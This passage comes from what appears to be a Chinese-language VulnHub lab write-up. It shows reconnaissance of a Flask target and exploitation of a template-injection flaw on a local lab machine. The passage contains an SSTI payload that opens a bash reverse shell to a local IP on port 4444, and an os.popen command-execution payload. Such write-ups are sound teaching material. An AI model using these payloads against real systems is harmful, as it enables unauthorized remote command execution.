&lt;/blockquote&gt;
&lt;p&gt;3 ）端口详细扫描&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.17 --min-rate 5000&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1244.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.17 靶机开放端口 21,22,80,5000&lt;/p&gt;
&lt;h3 id=&#34;ida反编译elf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ida反编译elf&#34;&gt;#&lt;/a&gt; IDA 反编译 ELF&lt;/h3&gt;
&lt;p&gt;匿名登陆 ftp 服务器寻找敏感信息，得到 pub 文件夹下的 url 文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1245.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 file 命令可以判断出 url 是一个 ELF 文件，要反编译 ELF 文件需要借助 IDA, 工具，这里将此文件传输到了一台具有 IDA 工具的电脑上&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1246.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;反编译之后在 main 方法中看到 /sh4d0w$s&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1247.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;leet加密语言&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#leet加密语言&#34;&gt;#&lt;/a&gt; leet 加密语言&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc=&#34;&gt;http://192.168.31.17&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1248.png&#34; width=&#34;280&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到一个奇怪的数字和英文单词 leet，查了一下其具体代表什么含义&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1249.png&#34; width=&#34;680&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;原来是一种黑客的加密语言，可以根据这一点生成一份字典&lt;/p&gt;
&lt;p&gt;利用 crunch 命令生成一份字典  &lt;code&gt;crunch 6 6 1337leet -o wordlist.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1250.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;由之前反编译产生的一个疑似目录的文件，进行访问&lt;/p&gt;
&lt;p&gt;[&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTcvc2g0ZDB3&#34;&gt;http://192.168.31.17/sh4d0w&lt;/span&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;192.168.31.17&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mn&gt;4&lt;/mn&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;s](http://192.168.31.17/sh4d0w&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;s)&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1251.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;扫描一下此网站是否存在敏感目录  &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.17/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1252.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC8=&#34;&gt;http://192.168.31.17:5000/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1253.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问地址 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC9zaDRkMHckcw==&#34;&gt;http://192.168.31.17:5000/sh4d0w$s&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1254.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;页面有回显表示漏洞就在这个地方，现在我们有一个敏感的 url 地址和一份字典，可以根据此字典爆破此 url 地址的输入&lt;/p&gt;
&lt;h3 id=&#34;ffuf模糊测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ffuf模糊测试&#34;&gt;#&lt;/a&gt; ffuf 模糊测试&lt;/h3&gt;
&lt;p&gt;使用 ffuf 测试 input 的参数应该是字典中的哪个&lt;br&gt;
 &lt;code&gt;ffuf - u &amp;quot;http://192.168.31.17:5000/sh4d0w\$s?FUZZ=/etc/passwd&amp;quot; -w wordli.txt -fs 8&lt;/code&gt; &lt;br&gt;
 加载到了一个为 l333tt 的地址，此种情况下页面回显为 200&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1255.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问此网站，发现了回显与输入的内容一致&lt;/p&gt;
&lt;p&gt;[&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC9zaDRkMHc=&#34;&gt;http://192.168.31.17:5000/sh4d0w&lt;/span&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;?&lt;/mo&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mn&gt;333&lt;/mn&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;192.168.31.17&lt;/mn&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mn&gt;5000&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mn&gt;4&lt;/mn&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;s?l333tt=pwd](http://192.168.31.17:5000/sh4d0w&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;s?l333tt=pwd)&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1256.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;换成其他的参数之后发现回显依旧是输入本身&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1257.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;利用 wappalyzer 发现网站时 python 写的、用的 flask 框架&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1258.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;ssti模板注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssti模板注入&#34;&gt;#&lt;/a&gt; SSTI 模板注入&lt;/h3&gt;
&lt;p&gt;既然是 flask 框架，就可以测试 SSTI 模版注入&lt;/p&gt;
&lt;p&gt;[&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTc6NTAwMC9zaDRkMHc=&#34;&gt;http://192.168.31.17:5000/sh4d0w&lt;/span&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;?&lt;/mo&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mn&gt;333&lt;/mn&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;!&lt;/mo&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mtext&gt;￼&lt;/mtext&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;192.168.31.17&lt;/mn&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mn&gt;5000&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mn&gt;4&lt;/mn&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;s?l333tt=100](http://192.168.31.17:5000/sh4d0w&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.5782em;vertical-align:-0.0391em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.77777em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.85396em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;￼&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;s?l333tt=100)&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1259.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;命令成功被执行，表示 SSTI 模板注入漏洞是存在的，如果不用浏览器进行渗透，用终端进行命令行访问的话需要编码及转义&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmVqc29uLmNvbS9lbmMvdXJsZW5jb2RlLw==&#34;&gt;https://www.bejson.com/enc/urlencode/&lt;/span&gt; 上进行 url 编码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1260.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;curl http://192.168.31.17:5000/sh4d0w\$s?l333tt=%7B%7B10*10%7D%7D&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1261.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;接下来就用这个模板的漏洞进行反弹 shell，先用最基础的试试&lt;br&gt;
 &lt;code&gt;&amp;#123;% import os %&amp;#125;&amp;#123;&amp;#123;os.system(&#39;bash -c &#34;bash -i &gt;&amp;/dev/tcp/192.168.31.99/4444 &gt;&amp;1&#34;&#39;)&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1262.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;服务器返回了错误，得换其他的方式&lt;/p&gt;
&lt;h3 id=&#34;ssti模板注入绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssti模板注入绕过&#34;&gt;#&lt;/a&gt; SSTI 模板注入绕过&lt;/h3&gt;
&lt;p&gt;用 url 编码尝试能否绕过&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1263.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;绕过失败，回显显示错误，shell 没有反弹出来，当然 curl 可能因为编码和转义的原因不太准确，不确定的话可以使用浏览器确认一下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1264.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试用以下方式执行系统命令 (浏览器会默认对空格、引号等自动 url 编码，直接访问即可)：&lt;br&gt;
 &lt;code&gt;&amp;#123;&amp;#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls -la&#39;).read()&amp;#125;&amp;#125;&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;http://192.168.31.17:5000/sh4d0w\$s?l333tt=&amp;#123;&amp;#123;%20config.__class__.__init__.__globals__[%27os%27].popen(%27ls%20-la%27).read()%20&amp;#125;&amp;#125;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1265.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;命令执行成功，返回了 ls -al 命令的信息，判断目标站点是否存在 nc、python、bash 等可反弹 shell 的命令&lt;/p&gt;
